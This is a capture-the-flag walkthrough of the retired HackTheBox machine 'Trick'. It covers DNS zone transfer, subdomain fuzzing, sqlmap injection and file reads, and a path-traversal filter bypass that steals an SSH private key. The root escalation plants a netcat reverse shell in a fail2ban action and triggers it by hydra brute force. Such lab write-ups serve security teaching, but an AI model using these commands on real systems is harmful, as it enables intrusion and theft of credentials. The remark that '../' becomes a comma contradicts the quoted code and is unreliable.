# Trick HackTheBox Writeup

**This writeup was completed after retirement of the machine, so it's all compiled from notes I took while hacking. It may not be fully complete, but it should outline the fundamentals of how to gain user/root access** 


We begin with a basic port enumeration:
```
Nmap 7.92 scan initiated Tue Oct 11 12:59:23 2022 as: nmap -A -T4 -p- -sC -sC -oA ../../nmap.results 10.10.11.166
Nmap scan report for 10.10.11.166
Host is up (0.080s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct 11 13:01:30 2022 -- 1 IP address (1 host up) scanned in 126.61 seconds
```
And see that there are 4 ports open:
* 22 -> we have ssh service running
* 25 ->
* 53 -> Some type of DNS service
* 80 -> Web service thats running with Bootstrap and nginx

Let's see if we can query the DNS to obtain the domain name:
```
::~/repos/HTB$ nslookup
> SERVER 10.10.11.166
Default server: 10.10.11.166
Address: 10.10.11.166#53
> 10.10.11.166
166.11.10.10.in-addr.arpa       name = trick.htb.
```

* The DNS service has been shotty, Ive nmapped the box multiple times, and sometimes the DNS service is not running.
Because we know DNS is running, and have the domain name, we can dig for more CNAME records to obtain more hostnames and DNS mappings:
```
$ dig trick.htb axfr @10.10.11.166
; <<>> DiG 9.18.7-1-Debian <<>> axfr trick.htb @trick.htb
;; global options: +cmd
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.		604800	IN	NS	trick.htb.
trick.htb.		604800	IN	A	127.0.0.1
trick.htb.		604800	IN	AAAA	::1
preprod-payroll.trick.htb. 604800 IN	CNAME	trick.htb.
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 80 msec
;; SERVER: 10.10.11.166#53(trick.htb) (TCP)
;; WHEN: Tue Oct 11 13:15:10 MST 2022
;; XFR size: 6 records (messages 1, bytes 231)
```
With this, we see another CNAME record for preprod-payroll.trick.htb... Lets add this to our /etc/hosts , along with trick.htb, and check out the site. 


Okay we play around and find that we can inject some stuff with sqlmap. First we inspect elements on the login page whilst we send a faulty login request. We go to the network tab and see this ajax.php?action=login request occuring when we click the login button. We can right click this and copy as a cURL request. Then copy that cURL command into the terminal, and change the cURL command to sqlmap... This will show us vulnerabilities. We can then add things like --dbs to see the databases and see one for 'payroll' so then go back to the same command once again and instead of --dbs we can do -D payroll_db --tables to see info about the tables in this database. Then same command with something like -D payroll_db -T users --dump to see the users table in here. It even shows us a password for this user.

But okay we can login as this user and not do much, and the creds dont work for SSH. So lets enumerate the website further and check to see if there are more preprod-* links....
```
$sed 's/^/preprod-/' /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt > preprod_wordlist
$wfuzz -c -w preprod_wordlist -H "Host: FUZZ.trick.htb" -u 10.10.11.166 -t 100 --hl 83
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.166/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000254:   200        178 L    631 W      9660 Ch     "preprod-market
                                                        ing"

Total time: 0
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 0

```

We see a succesful request for preprod-marketing, so lets add this to /etc/hosts and check out the website...
We move around the links and see that the page is managed with a parameter "page=" so there maybe some type of injection we can perform but it has protection agains a basic ../../../../../etc/passwd style example grab. So, lets also check it out with sqlmap to see what we can do...
sqlmap output:
```
$sqlmap --url "preprod-marketing.trick.htb/ajax.php?action=login" --data "username=test&password=test" --file-read "/var/www/market/index.php" --batch


[18:22:12] [INFO] retrieved: 194
[18:22:29] [INFO] the local file '/home/greeb/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_var_www_market_index.php' and the remote file '/var/www/market/index.php' have the same size (194 B)
files saved to [1]:
[*] /home/greeb/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_var_www_market_index.php (same file)
```
We can retreive files from this 

file grabbed with sqlmap:
<?php
$file = $_GET['page'];

if(!isset($file) || ($file=="index.php")) {
   include("/var/www/market/home.html");
}
else{
	include("/var/www/market/".str_replace("../","",$file));
}
?>


It looks as though it replaces all of the '../' sequences, with a comma ',' .Theres a workaround to this on payloadallthethings directory traversal methods. We can obtain /etc/passwd like so:

>http://preprod-marketing.trick.htb/index.php?page=..././..././..././etc/passwd


We have a user michael with their own home directory, lets see if we can obtain their ssh creds

>http://preprod-marketing.trick.htb/index.php?page=..././..././..././home/michael/.ssh/id_rsa

Yup theyre there, lets put em in a file and login...
```
curl "http://preprod-marketing.trick.htb/index.php?page=..././..././..././home/michael/.ssh/id_rsa" >> michael_id_rsa
```
now let's login:
```
$ssh michael@trick.htb -i michael_id_rsa
```
Now we have the user flag...

We explore around and see what commands we can run:
```
michael@trick.htb:~$sudo -l
```
and see that we can run 
/etc/init.d/fail2ban restart

Well there are plenty of ways we can privesc through fail2ban, one in particular would be a reverse shell picked up through netcat on our attacking machine...

There are two files in particular we want to look at:
```
/etc/fail2ban/jail.conf
/etc/fail2ban/action.d/iptables-multiport.conf
```
jail.conf will have all of the rules/parameters for banning listed...
We see that bans occur for a short period of time and also occur when failed ssh creds are entered 5 times as a retry.

So we can edit the /etc/fail2ban/action.d/iptables-multiport.conf file and change the actionban line to something like:
```
actionban = /usr/bin/nc 10.10.x.x 1337 -e /usr/bin/bash
```
to allow for a reverse shell to be picked up after a ban.  Now we can run:
```
$sudo /etc/init.d/fail2ban restart to restart the service.
```
I setup netcat to listen on my attacking machine...
```
$nc -lpvn 1337
```
Then use hydra, also on my attacking machine, to bruteforce an ssh login attempt because the retries will take too long by hand to get banned.
```
$hydra -l janice -P /usr/share/seclists/Passwords/chooseAList trick.htb ssh
```
Then we get a reverse shell with root privs picked up through netcat... And we have the flag at root/root.txt

